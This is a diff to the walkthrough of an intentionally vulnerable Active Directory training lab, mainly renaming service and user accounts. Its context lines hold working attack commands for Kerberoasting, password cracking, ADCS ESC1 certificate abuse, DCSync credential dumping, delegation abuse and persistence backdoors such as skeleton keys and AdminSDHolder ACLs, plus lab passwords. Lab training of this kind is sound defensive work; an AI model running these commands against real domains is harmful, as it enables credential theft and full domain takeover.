@@ -58,7 +58,7 @@ End-to-end operator walkthrough for the Damn Vulnerable Active Directory lab. Th
 
 | Account | Password |
 |---|---|
-| Any domain user (alice, bob, svc_web, …) | `DVADlab2024!` |
+| Any domain user (alice, bob, svc_vision, …) | `DVADlab2024!` |
 | `krbtgt` (every domain) | `KrbtgtDVAD2024!` |
 | Trust keys (corp↔finance, corp↔root) | `TrustKey2024!` |
 | `sa` on sql01 | `SqlServer2025!` |
@@ -204,7 +204,7 @@ VNC port per VM is in `qemu/vm-create.sh` (`VM_DEFS` table). See [`docs/09-vps-d
 
 ## 5. Attacker box prep
 
-DVAD assumes you attack **from your own** Kali / BlackArch / Parrot — `ws01.corp.local` is a *victim*, not a workstation. The attacker box sits on the host bridge (or, in VPS mode, on the WireGuard tunnel).
+DVAD assumes you attack **from your own** Kali / BlackArch / Parrot — `ws01.corp.local` is a *victim*, not an attacker workstation. The attacker box sits on the host bridge (or, in VPS mode, on the WireGuard tunnel).
 
 Install the canonical impacket/certipy stack:
 
@@ -488,14 +488,14 @@ nxc smb 10.10.0.10 -u users.txt -p 'DVADlab2024!' --continue-on-success | grep '
 # (c) Kerberoast every SPN with alice's creds
 impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kr
 hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt --force
-#  → svc_web : Summer2023!
+#  → svc_vision : Summer2023!
 
 # (d) Find ADCS ESC1 template
-certipy find -u svc_web@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 -stdout -vulnerable
+certipy find -u svc_vision@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 -stdout -vulnerable
 #  → ESC1Template (Domain Users enroll, ENROLLEE_SUPPLIES_SUBJECT, Client Auth EKU)
 
 # (e) Request a cert as Administrator
-certipy req -u svc_web@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 \
+certipy req -u svc_vision@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 \
             -ca CORP-CA -template ESC1Template -upn 'Administrator@corp.local'
 
 # (f) PKINIT → TGT + NT hash for Administrator
@@ -528,15 +528,15 @@ For wireframe diagrams + detection notes, see [`docs/08-solve-path.md`](docs/08-
 ```bash
 impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kr
 hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt --force
-# svc_web : Summer2023!
+# svc_vision : Summer2023!
 
-# Where is svc_web a local admin?
-nxc smb 10.10.0.0/24 -u svc_web -p 'Summer2023!' --local-auth
-nxc smb 10.10.0.0/24 -u svc_web -p 'Summer2023!'
+# Where is svc_vision a local admin?
+nxc smb 10.10.0.0/24 -u svc_vision -p 'Summer2023!' --local-auth
+nxc smb 10.10.0.0/24 -u svc_vision -p 'Summer2023!'
 
-# If svc_web has constrained delegation:
+# If svc_vision has constrained delegation:
 impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator \
-               corp.local/svc_web:'Summer2023!' -dc-ip 10.10.0.10
+               corp.local/svc_vision:'Summer2023!' -dc-ip 10.10.0.10
 export KRB5CCNAME=Administrator.ccache
 impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@dc01.corp.local
 ```
@@ -847,7 +847,7 @@ After Domain Admin, DVAD spec calls for persistence drops in every category. Pic
 | Domain | Silver Ticket | `impacket-ticketer -nthash <svc_nt> -domain-sid <CORP_SID> -domain corp.local -spn cifs/file01.corp.local Administrator` |
 | Domain | Skeleton key | `mimikatz # misc::skeleton` (every account auths with `mimikatz`) |
 | Domain | DSRM backdoor | `Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' DsrmAdminLogonBehavior 2` |
-| Domain | AdminSDHolder GenericAll | DVAD pre-creates this on `user2` → use it to re-add yourself |
+| Domain | AdminSDHolder GenericAll | DVAD pre-creates this on `tony.stark` → use it to re-add yourself |
 | Object | Shadow Credentials | `certipy shadow auto -u alice@corp.local -p ... -account Administrator` |
 | Object | RBCD | `impacket-rbcd -delegate-from 'evil$' -delegate-to 'dc01$' ...` |
 | Cert | Golden Certificate | Steal CA cert + private key from ca01 → forge certs offline |
@@ -1405,12 +1405,12 @@ Each ID maps to a concrete extraction or theft technique. The lab pre-stages eve
 | ID | Technique | One-liner |
 |---|---|---|
 | CRED-001 | Kerberoast all SPNs | `impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kr` |
-| CRED-002 | Targeted Kerberoast | `impacket-GetUserSPNs ... -request-user svc_web` |
+| CRED-002 | Targeted Kerberoast | `impacket-GetUserSPNs ... -request-user svc_vision` |
 | CRED-003 | AS-REP roast | `impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.0.10` |
 | CRED-004 | RC4 downgrade for hardened SPN | `impacket-GetUserSPNs ... -request -hashes :<NT>` |
-| CRED-005 | krbtgt extraction via DCSync | `impacket-secretsdump -just-dc-user krbtgt corp.local/sync_user:'DVADlab2024!'@10.10.0.10` |
+| CRED-005 | krbtgt extraction via DCSync | `impacket-secretsdump -just-dc-user krbtgt corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10` |
 | CRED-006 | Trust account hash | `impacket-secretsdump -just-dc-user 'FINANCE$' corp.local/Administrator@10.10.0.10` |
-| CRED-007 | Service account hash via DCSync | `impacket-secretsdump -just-dc-user svc_web corp.local/Administrator@10.10.0.10` |
+| CRED-007 | Service account hash via DCSync | `impacket-secretsdump -just-dc-user svc_vision corp.local/Administrator@10.10.0.10` |
 | CRED-008 | TGT export from ccache | `KRB5CCNAME=alice.ccache klist; cp $KRB5CCNAME .` |
 | CRED-009 | Diamond ticket | `Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512` |
 | CRED-010 | Sapphire ticket | `Rubeus.exe golden /sapphire /aes256:<krbtgt_aes256> /user:Administrator /id:500` |
@@ -1590,7 +1590,7 @@ Movement techniques you'll exercise once you hold a credential.
 
 | ID | Technique | One-liner |
 |---|---|---|
-| PE-019 | DCSync from svc account | `impacket-secretsdump -just-dc corp.local/sync_user:'DVADlab2024!'@10.10.0.10` |
+| PE-019 | DCSync from svc account | `impacket-secretsdump -just-dc corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10` |
 | PE-020 | AdminSDHolder GenericAll → reset DA pwd | `Set-ADAccountPassword -Identity Administrator -NewPassword (...)` |
 | PE-021 | Backup Operators → DC SAM/SYSTEM | (file01 svc holds Backup Operators) |
 | PE-022 | Server Operators | (operator) |
@@ -1643,7 +1643,7 @@ Movement techniques you'll exercise once you hold a credential.
 | PER-005 | Skeleton Key | `mimikatz # misc::skeleton` |
 | PER-006 | DSRM | `Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior 2` |
 | PER-007 | DSRM password sync | `mimikatz # lsadump::setntlm /user:Administrator /ntlm:<NT>` |
-| PER-008 | AdminSDHolder ACL backdoor | `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder...' -Rights All -PrincipalIdentity user2` |
+| PER-008 | AdminSDHolder ACL backdoor | `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder...' -Rights All -PrincipalIdentity tony.stark` |
 | PER-009 | Krbtgt ACL backdoor | (write `Replicating Directory Changes` to non-priv principal) |
 | PER-010 | New DA via group write | `net group 'Domain Admins' evil_user /add /domain` |
 | PER-011 | GPO start-up script | (drop `\\<dc>\SYSVOL\corp.local\Policies\<gpo>\Machine\Scripts\Startup\evil.ps1`) |
@@ -1686,7 +1686,7 @@ Movement techniques you'll exercise once you hold a credential.
 | PER-033 | LNK in writable share | `copy evil.lnk \\file01\Public$\` |
 | PER-034 | Hidden user (`u$ /add`) | `net user evil$ Pass1! /add` |
 | PER-035 | Domain admin via SID History | (Pattern V) |
-| PER-036 | Backdoor service account password | `Set-ADAccountPassword svc_web -NewPassword (...)` |
+| PER-036 | Backdoor service account password | `Set-ADAccountPassword svc_vision -NewPassword (...)` |
 | PER-037 | Backdoor gMSA | `Set-ADServiceAccount gmsa_file -PrincipalsAllowedToRetrieveManagedPassword 'evil$'` |
 
 ---
@@ -1766,13 +1766,13 @@ The 8 VMs each have a distinct attack surface. These are quick references; the f
 | Ports | 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 5986, 9389 |
 | RPC pipes | `\PIPE\netlogon`, `\PIPE\samr`, `\PIPE\lsarpc`, `\PIPE\srvsvc`, `\PIPE\efsrpc` (PetitPotam), `\PIPE\spoolss` (PrinterBug), `\PIPE\drsuapi` (DCSync) |
 | Shares | `SYSVOL`, `NETLOGON`, `C$`, `ADMIN$`, `IPC$` |
-| Pre-loaded vulns | DoNotRequirePreAuth users, Kerberoastable SPNs, ZeroLogon (`FullSecureChannelProtection=0`), unconstrained delegation hosts visible, sync_user with DCSync rights, weak password policy (4-char minimum), SMB signing not required, LDAP signing not required, AdminSDHolder backdoor on `user2`, `krbtgt`=`KrbtgtDVAD2024!` |
+| Pre-loaded vulns | DoNotRequirePreAuth users, Kerberoastable SPNs, ZeroLogon (`FullSecureChannelProtection=0`), unconstrained delegation hosts visible, doctor.strange with DCSync rights, weak password policy (4-char minimum), SMB signing not required, LDAP signing not required, AdminSDHolder backdoor on `tony.stark`, `krbtgt`=`KrbtgtDVAD2024!` |
 | Reach from | Every subnet (DCs are at the center of every trust path) |
 | Pivot value | DA here = corp/eu/finance/root via Patterns G, I, P, Q, R, V |
 
 ```bash
 # Top-priority enumeration once you have any cred
-impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 -just-dc-user krbtgt
+impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc-user krbtgt
 nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --kerberoasting all --asreproast all
 certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
 rpcdump.py 10.10.0.10 | grep -E 'efsrpc|spoolss|drsuapi'
@@ -2021,7 +2021,7 @@ IA-001 nxc null-session enum         (no creds)
     ↓
 IA-006 password spray DVADlab2024!  (alice : DVADlab2024!)
     ↓
-A      Kerberoast svc_web           (svc_web : Summer2023!)
+A      Kerberoast svc_vision           (svc_vision : Summer2023!)
     ↓
 B      ADCS ESC1 → Administrator    (Administrator NT hash)
     ↓
@@ -2057,7 +2057,7 @@ IA-011 mssqlclient sa:SqlServer2025!  (sql01 cmd exec)
     ↓
 PE     SeImpersonate → SYSTEM         (NT AUTHORITY\SYSTEM on sql01)
     ↓
-J      LSASS dump → svc_sql hash      (svc_sql NT)
+J      LSASS dump → svc_jarvis hash      (svc_jarvis NT)
     ↓
 LinkedSrv → dc01 EXEC                 (alice creds harvested)
     ↓
@@ -2299,15 +2299,15 @@ hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt --force
 
 ## Evidence
 - `spns.kr` (attached)
-- `hashcat.potfile` excerpt: `$krb5tgs$23$*svc_web$CORP.LOCAL...:Summer2023!`
-- Screenshot: BloodHound path "Domain Users → svc_web (Kerberoastable) → Domain Admins"
+- `hashcat.potfile` excerpt: `$krb5tgs$23$*svc_vision$CORP.LOCAL...:Summer2023!`
+- Screenshot: BloodHound path "Domain Users → svc_vision (Kerberoastable) → Domain Admins"
 
 ## Impact
 Initial-foothold low-priv user obtains a service-account password that grants
 local Administrator on file01 + sql01, enabling lateral movement.
 
 ## Recommendation
-1. Rotate `svc_web` to a 25+ char machine-generated password or migrate to gMSA
+1. Rotate `svc_vision` to a 25+ char machine-generated password or migrate to gMSA
 2. Enforce AES-only Kerberos (set `msDS-SupportedEncryptionTypes` = 0x18)
 3. Enable Audit Kerberos Service Ticket Operations (Success/Failure)
 4. Deploy a Kerberoast detection rule (Sysmon event 4769 etype 0x17)
@@ -2494,7 +2494,7 @@ After importing the `bloodhound-python --collectionmethod all --zip` output, the
 |---|---|---|
 | Find all Domain Admins | DA list per domain | Confirms tenant boundary |
 | Find Shortest Paths to Domain Admins | Hop chain from any node | Choose your attack target |
-| Find Principals with DCSync Rights | Who can `secretsdump -just-dc` | Promotes `sync_user` to your "free win" |
+| Find Principals with DCSync Rights | Who can `secretsdump -just-dc` | Promotes `doctor.strange` to your "free win" |
 | Find Kerberoastable Accounts | Users with SPNs | Drives Pattern A target selection |
 | Find AS-REP Roastable Users | `DoNotRequirePreAuth` set | Drives IA-005 target selection |
 | Find Computers with Unconstrained Delegation | TGT capture surface | Drives Pattern W |
@@ -2789,7 +2789,7 @@ impacket-getTGT corp.local/alice:... -dc-ip 10.10.0.10 -k -no-pass
 ```bash
 # S4U2Self + S4U2Proxy (constrained delegation / RBCD)
 impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator \
-               corp.local/svc_web:'Summer2023!' -dc-ip 10.10.0.10
+               corp.local/svc_vision:'Summer2023!' -dc-ip 10.10.0.10
 # Cross-realm with -target-domain
 impacket-getST -k -no-pass -target-domain finance.local -dc-ip 10.20.0.10 \
                -spn cifs/dc01.finance.local -impersonate Administrator \
@@ -2806,7 +2806,7 @@ impacket-getST -force-forwardable -spn cifs/dc01 -impersonate Administrator ...
 # Roast every SPN
 impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kr
 # Roast a single user
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request-user svc_web
+impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request-user svc_vision
 # Cross-realm
 impacket-GetUserSPNs -k -no-pass -target-domain finance.local -dc-ip 10.20.0.10 -request corp.local/alice
 # Use NT hash
@@ -3045,9 +3045,9 @@ john --format=netntlmv2 --wordlist=rockyou.txt hashes.txt
 | Account | Password | Strategy |
 |---|---|---|
 | `alice` | `DVADlab2024!` | Straight wordlist (custom add) |
-| `svc_web` | `Summer2023!` | Wordlist + season-year rule |
+| `svc_vision` | `Summer2023!` | Wordlist + season-year rule |
 | `svc_legacy` | `Welcome1` | Top-100 wordlist |
-| `svc_sql` | `SqlServer2025!` | Custom dict (lab-name based) |
+| `svc_jarvis` | `SqlServer2025!` | Custom dict (lab-name based) |
 | `dvad_user` | `Spring2024!` | Wordlist + season-year |
 | `backup_op` | `Password1` | Top-10 |
 | `svc_nopreauth` | `Welcome1` | Top-100 |
@@ -3560,7 +3560,7 @@ Each pattern below adds operator notes, expected failure modes, opsec considerat
 
 **Theory**: Any authenticated principal can request a TGS for any SPN. The TGS-REP contains a portion encrypted with the *service account*'s NT hash. If the service account password is weak, offline crack recovers the cleartext.
 
-**Pre-condition**: ≥1 user with SPN registered (DVAD: svc_web, svc_sql, svc_iis, svc_sccm).
+**Pre-condition**: ≥1 user with SPN registered (DVAD: svc_vision, svc_jarvis, svc_iis, svc_sccm).
 **Time to DA**: 1-15 min depending on crack performance.
 
 **Operator one-liner (preferred)**:
@@ -3573,7 +3573,7 @@ hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt -r \
 ```
 
 **Common failures**:
-- `KDC_ERR_S_PRINCIPAL_UNKNOWN` — SPN doesn't exist; check with `setspn -L svc_web`
+- `KDC_ERR_S_PRINCIPAL_UNKNOWN` — SPN doesn't exist; check with `setspn -L svc_vision`
 - Empty result — no SPNs in the domain; DVAD ships at least 8
 - Hashcat says cracked but TGS reuses RC4 → ensure `-m 13100` not `-m 19700`
 
@@ -3582,11 +3582,11 @@ hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt -r \
 **Validation**:
 
 ```bash
-nxc smb 10.10.0.0/24 -u svc_web -p 'Summer2023!' --shares
+nxc smb 10.10.0.0/24 -u svc_vision -p 'Summer2023!' --shares
 # expect: PWN3D! on file01 + sql01
 ```
 
-**Follow-on patterns**: B (ESC1 with svc_web), D (RBCD with svc_web), J (LSASS dump on file01 if local admin).
+**Follow-on patterns**: B (ESC1 with svc_vision), D (RBCD with svc_vision), J (LSASS dump on file01 if local admin).
 
 ### Pattern B — ADCS ESC1 deep-dive
 
@@ -4800,19 +4800,19 @@ $ impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -reques
 Impacket v0.12.0 - Copyright 2023 Fortra
 ServicePrincipalName              Name      MemberOf  PasswordLastSet  LastLogon  Delegation 
 --------------------------------  --------  --------  ---------------  ---------  ----------
-MSSQLSvc/sql01.corp.local:1433    svc_sql            2026-04-01...
-HTTP/file01.corp.local            svc_web            2026-04-01...
+MSSQLSvc/sql01.corp.local:1433    svc_jarvis            2026-04-01...
+HTTP/file01.corp.local            svc_vision            2026-04-01...
 http/iis.corp.local               svc_iis            2026-04-01...
 
 $ hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt --force
-$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/file01.corp.local*$...:Summer2023!
-$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$...:SqlServer2025!
+$krb5tgs$23$*svc_vision$CORP.LOCAL$HTTP/file01.corp.local*$...:Summer2023!
+$krb5tgs$23$*svc_jarvis$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$...:SqlServer2025!
 ```
 
 ### O.4 ADCS ESC1
 
 ```text
-$ certipy find -u svc_web@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 -vulnerable -stdout
+$ certipy find -u svc_vision@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 -vulnerable -stdout
 Certificate Templates
   0
     Template Name                          : ESC1Template
@@ -4822,7 +4822,7 @@ Certificate Templates
     Client Authentication                  : True
     Vulnerabilities                        : ESC1
 
-$ certipy req -u svc_web@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 \
+$ certipy req -u svc_vision@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 \
               -ca CORP-CA -template ESC1Template -upn Administrator@corp.local
 [*] Saved certificate and private key to 'administrator.pfx'
 
@@ -5012,7 +5012,7 @@ Rubeus.exe asreproast /ou:"OU=ServiceAccounts,DC=corp,DC=local" /format:hashcat
 
 ```
 Rubeus.exe kerberoast /outfile:kerb.txt
-Rubeus.exe kerberoast /user:svc_sql /format:hashcat
+Rubeus.exe kerberoast /user:svc_jarvis /format:hashcat
 Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433 /format:hashcat
 Rubeus.exe kerberoast /rc4opsec /nowrap
 Rubeus.exe kerberoast /stats
@@ -5092,9 +5092,9 @@ Full enumeration of all 382 IDs would be a small book; this appendix indexes the
 | ENUM-014 | dc01 | gMSA enumeration | `nxc ldap ... -M gmsa` |
 | ENUM-027 | dc01 | Cert template enum | `certipy find -u alice -p ... -dc-ip 10.10.0.10 -text` |
 | REC-005 | dc01 | DC fingerprint via `nltest` | `nltest /dsgetdc:corp.local` |
-| CRED-001 | sql01 | Kerberoast svc_sql | Rubeus / GetUserSPNs |
+| CRED-001 | sql01 | Kerberoast svc_jarvis | Rubeus / GetUserSPNs |
 | CRED-002 | dc01 | AS-REP roast | GetNPUsers |
-| CRED-007 | dc01 | DCSync via sync_user | secretsdump |
+| CRED-007 | dc01 | DCSync via doctor.strange | secretsdump |
 | CRED-019 | file01 | RBCD on FILE01$ | `rbcd.py` + S4U |
 | CRED-022 | ca01 | ESC1 cert request | `certipy req` |
 | CRED-031 | dc01 | ESC8 NTLM relay to web enroll | `ntlmrelayx -t http://ca01/certsrv/.../certfnsh.asp` |
